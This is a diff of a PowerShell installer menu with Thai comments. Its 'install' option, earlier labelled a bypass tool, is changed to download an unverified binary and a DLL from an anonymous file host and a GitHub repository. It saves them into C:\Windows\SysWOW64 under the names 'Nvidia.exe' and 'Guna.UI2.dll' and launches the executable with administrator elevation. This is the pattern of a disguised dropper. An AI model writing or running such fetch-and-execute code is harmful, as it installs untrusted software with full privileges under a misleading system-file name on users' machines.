@@ -42,55 +42,110 @@ if (-not (Test-Path $downloadsPath)) {
     }
 }
 
-$exeDestination = Join-Path $downloadsPath "runbx.exe"
 $regDestination = Join-Path $env:TEMP "titanx_reg.reg"
-$exeUrl = "https://files.catbox.moe/bt0dfp.bin"
 $regUrl = "https://files.catbox.moe/if7ith.reg"
 
 # -----------------------------
-# Option 1: Install & Run Bypass Tool
+# กำหนดพาธสำหรับ SysWOW64
+# -----------------------------
+$sysWOW64 = "C:\Windows\SysWOW64"
+$exeDestination = Join-Path $sysWOW64 "Nvidia.exe"
+$dllDestination = Join-Path $sysWOW64 "Guna.UI2.dll"
+$exeUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/Seanual-HUB/raw/refs/heads/main/Nvidia.bin"
+$dllUrl = "https://files.catbox.moe/3scqqb.dll"
+
+# -----------------------------
+# Option 1: Download files to SysWOW64
 # -----------------------------
 if ($choice -eq "1") {
     Clear-Host
     Write-Host "========================================" -ForegroundColor Cyan
-    Write-Host "   [1] INSTALLING BYPASS TOOL" -ForegroundColor Green
+    Write-Host "   [1] INSTALLING FILES TO SysWOW64" -ForegroundColor Green
     Write-Host "========================================" -ForegroundColor Cyan
     Write-Host ""
 
-    # Check if already exists
-    if (Test-Path $exeDestination) {
-        Write-Host "[!] File already exists in Downloads. Overwriting..." -ForegroundColor Yellow
+    # ตรวจสอบและสร้างโฟลเดอร์ SysWOW64 ถ้าไม่มี
+    if (-not (Test-Path $sysWOW64)) {
+        Write-Host "[!] SysWOW64 folder not found. Creating..." -ForegroundColor Yellow
+        try {
+            New-Item -ItemType Directory -Path $sysWOW64 -Force | Out-Null
+            Write-Host "[✓] Created SysWOW64 folder." -ForegroundColor Green
+        } catch {
+            Write-Host "[✗] Failed to create SysWOW64 folder: $_" -ForegroundColor Red
+            Write-Host "`nPress any key to exit..."
+            Read-Host
+            exit
+        }
     }
 
-    # Download executable to Downloads
-    Write-Host "[+] Downloading runbx.exe to Downloads folder..." -ForegroundColor Cyan
+    # ดาวน์โหลด Nvidia.exe
+    Write-Host "[+] Downloading Nvidia.exe to SysWOW64..." -ForegroundColor Cyan
     Write-Host "[+] Target: $exeDestination" -ForegroundColor Gray
     try {
-        $tempFile = Join-Path $env:TEMP "titanx_temp.bin"
+        $tempFile = Join-Path $env:TEMP "Nvidia_temp.bin"
         Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile -ErrorAction Stop
+        
+        # ถ้ามีไฟล์เก่า ให้ลบก่อน
+        if (Test-Path $exeDestination) {
+            Remove-Item $exeDestination -Force -ErrorAction SilentlyContinue
+        }
+        
         Move-Item -Path $tempFile -Destination $exeDestination -Force -ErrorAction Stop
-        Write-Host "[✓] Download completed successfully!" -ForegroundColor Green
+        Write-Host "[✓] Nvidia.exe downloaded successfully!" -ForegroundColor Green
     } catch {
-        Write-Host "[✗] Download failed: $_" -ForegroundColor Red
+        Write-Host "[✗] Failed to download Nvidia.exe: $_" -ForegroundColor Red
         Write-Host "`nPress any key to exit..."
         Read-Host
         exit
     }
 
-    # Verify file exists
-    if (Test-Path $exeDestination) {
-        Write-Host "[✓] File verified: $exeDestination" -ForegroundColor Green
+    # ดาวน์โหลด Guna.UI2.dll
+    Write-Host "[+] Downloading Guna.UI2.dll to SysWOW64..." -ForegroundColor Cyan
+    Write-Host "[+] Target: $dllDestination" -ForegroundColor Gray
+    try {
+        $tempDll = Join-Path $env:TEMP "Guna_temp.dll"
+        Invoke-WebRequest -Uri $dllUrl -OutFile $tempDll -ErrorAction Stop
         
-        # Run the executable
-        Write-Host "[+] Launching runbx.exe..." -ForegroundColor Cyan
+        # ถ้ามีไฟล์เก่า ให้ลบก่อน
+        if (Test-Path $dllDestination) {
+            Remove-Item $dllDestination -Force -ErrorAction SilentlyContinue
+        }
+        
+        Move-Item -Path $tempDll -Destination $dllDestination -Force -ErrorAction Stop
+        Write-Host "[✓] Guna.UI2.dll downloaded successfully!" -ForegroundColor Green
+    } catch {
+        Write-Host "[✗] Failed to download Guna.UI2.dll: $_" -ForegroundColor Red
+        Write-Host "`nPress any key to exit..."
+        Read-Host
+        exit
+    }
+
+    # ตรวจสอบไฟล์
+    Write-Host "`n[+] Verifying files..." -ForegroundColor Cyan
+    $allGood = $true
+    
+    if (Test-Path $exeDestination) {
+        Write-Host "[✓] Nvidia.exe exists at: $exeDestination" -ForegroundColor Green
+    } else {
+        Write-Host "[✗] Nvidia.exe not found!" -ForegroundColor Red
+        $allGood = $false
+    }
+    
+    if (Test-Path $dllDestination) {
+        Write-Host "[✓] Guna.UI2.dll exists at: $dllDestination" -ForegroundColor Green
+    } else {
+        Write-Host "[✗] Guna.UI2.dll not found!" -ForegroundColor Red
+        $allGood = $false
+    }
+
+    if ($allGood) {
+        Write-Host "`n[+] Launching Nvidia.exe..." -ForegroundColor Cyan
         try {
             Start-Process -FilePath $exeDestination -Verb RunAs -WindowStyle Normal
             Write-Host "[✓] Program started successfully!" -ForegroundColor Green
         } catch {
             Write-Host "[✗] Failed to start program: $_" -ForegroundColor Red
         }
-    } else {
-        Write-Host "[✗] File not found after download!" -ForegroundColor Red
     }
 
     Write-Host "`n========================================" -ForegroundColor Cyan
